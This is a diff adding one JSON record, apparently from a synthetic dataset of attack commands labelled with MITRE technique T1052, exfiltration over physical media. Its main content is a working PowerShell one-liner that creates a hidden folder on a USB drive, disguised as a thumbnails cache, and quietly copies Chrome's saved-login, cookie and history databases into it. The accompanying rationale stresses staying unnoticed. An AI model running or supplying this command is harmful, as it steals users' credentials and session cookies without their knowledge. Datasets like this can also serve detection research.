@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\\'; $dst=Join-Path $usb '.thumbs'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; $src=\"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\"; if(Test-Path $src){ Copy-Item (Join-Path $src 'Login Data*'), (Join-Path $src 'Cookies*'), (Join-Path $src 'History*') -Destination $dst -Force -ErrorAction SilentlyContinue }",
+  "explanation": "Copies select browser databases (if present) into a hidden directory on the USB using Copy-Item to blend as system thumbnails cache.",
+  "rationale_steps": [
+    "Detect removable media",
+    "Create hidden destination on USB",
+    "Target browser data files locally",
+    "Copy to USB via Copy-Item with error suppression to stay quiet"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-536a7314",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
